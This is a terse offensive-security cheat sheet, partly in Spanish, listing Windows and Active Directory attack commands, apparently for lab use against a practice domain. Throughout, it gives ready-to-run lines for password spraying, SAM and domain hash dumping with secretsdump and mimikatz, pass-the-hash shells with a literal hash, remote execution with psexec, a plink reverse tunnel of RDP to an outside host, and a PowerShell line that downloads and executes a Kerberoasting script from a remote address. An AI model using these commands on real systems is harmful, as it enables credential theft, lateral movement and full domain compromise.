# smbserver
python3 /usr/share/doc/python3-impacket/examples/smbserver.py compartida . -smb2support
impacket-smbserver COMPARTIDA . -smb2support -u USUARIO -p PASSWORD

# crackmapexec
crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz
crackmapexec smb 10.21.16.0/24 -u 'user' -p cul_spray.txt -M enum_avproducts
crackmapexec smb ip -u 'user' -H 'hash' -x 'CMD'
crackmapexec smb ip -u user.txt -p pass.txt --continue-on-success
crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --rid-brute
crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --shares
crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --sam
crackmapexec smb 10.21.16.0/24 -u 'users.txt' -p cul_spray.txt
crackmapexec smb IP -u user -p pass --shares --M spider_plus

# psexec
psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"
psexec.py 'user:pass@ip'
psexec.py WORKGROUP/user:pass@ip CMD
psexec.py DOMAIN/USER:PASS@ip CMD
psexec.py user:pass@10.21.16.112 cmd.exe

# impacket-psexec windows test config:
+ crear dword(32) LocalAccountTokenFilterPolicy valor 1 en
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system

+ abrir los puertos 139 (udp) 445 (tcp)
netsh advfirewall firewall add rule name="psexec-tcp" dir=in action=allow protocol=TCP localport=445
netsh advfirewall firewall add rule name="psexec-udp" dir=in action=allow protocol=UDP localport=137

# kerbrute enumeration
./kerbrute userenum --dc spookysec.local -d spookysec.local users.txt -o ker_users.txt

# impacket-GetNPUsers TGT request
impacket-GetNPUsers spookysec.local/svc-admin -no-pass

# secretsdump.py retrieve all of the password hashes that this user account (that is synced with the domain controller) -- necesitamos saber el password
secretsdump.py -just-dc spookysec/backup@spookysec.local
secretsdump.py -just-dc-ntlm spookysec/backup@spookysec.local

# evil-winrm remote shell con hash
evil-winrm  -i spookysec.local -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'

# powerview
Enumerate the domain users - Get-NetUser | select cn   
Enumerate the domain groups - Get-NetGroup -GroupName *admin*  
enumerate smb share folders - Get-SmbShare
enumerate OS - Get-NetComputer -fulldata | select operatingsystem
enumerate kerberoastable users - Get-NetUser -SPN | select samaccountname,description

# mimikatz
privilege::debug
lsadump::lsa /patch

# invoke-kerberoast
python3 -m SimpleHTTPServer 80
IEX(New-Object Net.WebClient).DownloadString('http://10.14.15.207/Invoke-kerberoast.ps1');Invoke-kerberoast -OutputFormat hashcat | fl
